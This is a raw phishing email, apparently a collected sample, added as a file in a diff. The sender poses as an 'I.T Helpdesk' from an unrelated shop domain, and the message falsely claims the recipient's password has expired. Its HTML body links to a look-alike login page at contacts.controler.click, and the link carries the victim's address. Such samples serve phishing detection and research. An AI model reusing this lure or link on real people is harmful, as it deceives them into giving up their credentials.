@@ -1,0 +1,102 @@
+Return-Path: xinfoadminx@aimsshop.com.np
+Delivered-To: jose@monkey.org
+X-FDA: 83239438506.27.E726323
+Received: from grace.mysecurecloudserver.com (grace.mysecurecloudserver.com
+ [178.63.99.84])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP id A57EEC0008
+	for <jose@monkey.org>; Wed, 19 Mar 2025 20:28:31 +0000 (UTC)
+Authentication-Results: imf06.b.hostedemail.com;
+	dkim=pass header.d=aimsshop.com.np header.s=default header.b=pnfUd2qJ;
+	spf=pass (imf06.b.hostedemail.com: domain of xinfoadminx@aimsshop.com.np
+ designates 178.63.99.84 as permitted sender)
+ smtp.mailfrom=xinfoadminx@aimsshop.com.np;
+	dmarc=pass (policy=none) header.from=aimsshop.com.np
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1742416111;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=qfYi8yXg9wvPFCpQkbKmy/CYxf+wwH26Igf3lR84kBY=;
+	b=qDbfL8NzH5wpbeaxL5Hy/GGCjsblpK0Tu6XMsK3ASVxj8xhC6KyZtYlNHOqnzJzTSlvZFq
+	iXInuSEsVctJJvZniatnCJSgf4LlI3RJVjSYEZ80dU0551FADWBaeRjkN2kpEI8quH+28R
+	5g5mW1YUrKVW/aKKSaFIpBJhMkx2ioU=
+ARC-Authentication-Results: i=1;
+	imf06.b.hostedemail.com;
+	dkim=pass header.d=aimsshop.com.np header.s=default header.b=pnfUd2qJ;
+	spf=pass (imf06.b.hostedemail.com: domain of xinfoadminx@aimsshop.com.np
+ designates 178.63.99.84 as permitted sender)
+ smtp.mailfrom=xinfoadminx@aimsshop.com.np;
+	dmarc=pass (policy=none) header.from=aimsshop.com.np
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1742416111; a=rsa-sha256;
+	cv=none;
+	b=ObsLHCJJo4pfrs2DnTVtBzeW6byCyLIB0j/OUbO7SHWSMw7oxDdMJztm8A99aAebGxL9Ri
+	IsZql0ugNJti7qjm4ZpJisS/IEG9Cs8HlwMKVT3tPPF9jC3FarlMHdoISyURWwKDmVgmcc
+	CQvbv1A3OGKszghfJIaE5Pkc+GteA2M=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=aimsshop.com.np; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=qfYi8yXg9wvPFCpQkbKmy/CYxf+wwH26Igf3lR84kBY=; b=pnfUd2qJuIT6E45jhWrpBjFbIP
+	nvKMg2gep8mgnKEZ57gmhkxpVQdGezqONEbsTru+JWcwJTnYlpWkzoLOJNHLNDONutLrfxBpasCCc
+	1PJTi0+8jMIr1eQhYPVnu9cs7JBHyGLWbrUdCxlMKXTq8TvgAkPf38hSgc6ARfUyPJYw1w58wfQmQ
+	kSqrRf2blWLpsb8yWRGii2STmeQC0wsmmnvJOnchS9Z74+njmC0AIXwlxZeGBq0lEo7QbVdgDmkiL
+	3yS9Nzn7bmoPFibBgi462M24XiP2O7nYCwUB6GzAthaPrcqx9hmz4pnlQOm17hswM8Pcfgy2muW4W
+	eeqPbwDQ==;
+Received: from [38.240.33.73] (port=50335 helo=aimsshop.com.np)
+	by grace.mysecurecloudserver.com with esmtpsa  (TLS1.2) tls
+ TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.98.1)
+	(envelope-from <xinfoadminx@aimsshop.com.np>)
+	id 1tv01e-00000000iiU-0Ybo
+	for jose@monkey.org;
+	Wed, 19 Mar 2025 21:28:30 +0100
+From: I.T Helpdesk<xinfoadminx@aimsshop.com.np>
+To: jose@monkey.org
+Subject: ATTENTION: Password key expired! ( jose )
+Date: 19 Mar 2025 21:28:29 +0100
+Message-ID: <20250319212829.4782AA822F7A9C8D@aimsshop.com.np>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - grace.mysecurecloudserver.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - aimsshop.com.np
+X-Get-Message-Sender-Via: grace.mysecurecloudserver.com: authenticated_id:
+ xinfoadminx@aimsshop.com.np
+X-Authenticated-Sender: grace.mysecurecloudserver.com:
+ xinfoadminx@aimsshop.com.np
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Stat-Signature: t7fwpsqfcyazfrr38jf8pppcbjyeui8n
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: A57EEC0008
+X-Spam-Status: No, score=1.50
+X-HE-Tag: 1742416111-862708
+X-HE-Meta: 
+ U2FsdGVkX18czaOS3xHAorHqiX493qcicgypS9aod6be2j161VhLICbzdlA/OiqMvYKzA/a1pk4U8/E8sf7Cdnz1aYoqhMQDIp4UAtFUpiZFOnaDpZoXaW/A7r1E3+pjAi26x3U9rIxjbz/xndJkJnveYB9Bv6LVT/DmkcDy3x+0xHMUqaOCtS04jUxn3cVR98EoISLOlB3bANk6n1uSjdSjbGX0rQ+ak9u9tlBdX5WeG7eYZTe1yMEM+IRtzzTRrrjDNcWKnTh4rgfd1qwZpt2UppFuY6QNIy89l83SuFb7VY/1YquJMFONnTM+kOzzOdaHYS1eWSn6wTU8vztlbhOiprvTdx71LOwdkuR/FIh1gUyuLFYgtymVLjZbUytenrtsHk/qP4RpygdMsiDy4kmolK/JZPdatjlmC7RAk0xxx/GEJ7hhlb8bs6sJ+axieds3oHUrk2t/0CRBa3C4O9dQQmKgYGtW0SszjpG+NFenzPwi0JurdbaS5Gq1bkozVJ3ADzlEH4Df+l7GjjnkOjunSdVCGknEXjLT31+RpdefAn2D3nR/8i0Qw2boOIHWYovx2K+mEIPKUDemtSTdQzMYh6Ll6QnZnIts48RidqOQgkoWUCX69meU4RjU8kRoNduRmqFOIjSwAabTbKXqIoIOz4Jl4SnNmDiTFRcYMJOZD5SJyq82WeX6Q/C8je3lvrZ+7ikNFbZoPzSECzWS12cJzZYKg5yW1TYBFm+kcskjSVXwrULYXu+sV4sF+OZ5ADxahY67zeRHusJQUFu03G04o3qD/zSCWS+MGs+wFbjOEevqKhu2WqleivTxXXyV5WZVJkqtDPVcGpQTFnOI4bbbkmngu9aM5uAPVVxHjjRaa9gP4UBRnrablyMiu8Xbg0EzkWkEWo3GYhnCuZgb9dy/d98YIMSfgcQai8t8tZoK5qK78VaouVeBrSxeUsicYsLTGINfxvrUKHacnnhf9eEyMWN
+ lpgkTGzkv3tG6IJ634PZv1SVSu8qNq/Zla+2EvDAOBciGvhzSBZ5yAug/moF80edeTDEgWuVozMAuHYBsq0D9aNwbhIJqBMmJnJvhdARSH/7aWaUfvP3FEZdcsx7kW1M2mazgWfijfmmaAQiKsq/Q0MWCpqLqxNGHOn/JCz4R0/jW2gG14PtmzMT/EJCoIR+1osz7hoofqIVMESxpTczXIXu/tkuT/UUlOFq9EvbBHKxwvPXD4X7Q7My+wefDMXv+l6LKy7rqe2np/weoMNnKbk+Bfiq2jf5oux8G19UuYaXBIjv8QwYd+ZUEJVBEfPror8oadgbqVZwuCyrY5LdK1GDv7EGzDt6ZCBjc5hvMgobJgDkmBa+oayixInBVXDAxPSB3hP+0IRDRHK9KOywk7orA3JnSqN+a4DWa/U+Njubm3JmuVu3fFNHrmHWR1BTRXCporeaeBjhYHws1H4pHRRih8rfmcbLDfCm3Ob5LLrYJHq06exlnA86izaTcyIcb3g+ZCcxdtdqf45PKf072OjwSzVqa5KSUVS6UPF9ycfZdawWnHuoA82GbVJJKA9XXra30ynfSSs4vxig=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 95
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<P style=3D"FONT-SIZE: 11px; FONT-FAMILY: Arial, Helvetica, sans-serif; COL=
+OR: rgb(34,34,34)">Password has expired.</P>
+<P style=3D"FONT-SIZE: 11px; FONT-FAMILY: Arial, Helvetica, sans-serif; COL=
+OR: rgb(34,34,34)">Click&nbsp;<A href=3D"https://contacts.controler.click/c=
+ommunications.asp?good=3Djose@monkey.org" target=3D_blank>log in</A>&nbsp;t=
+o confirm your account.</P></BODY></HTML>
+
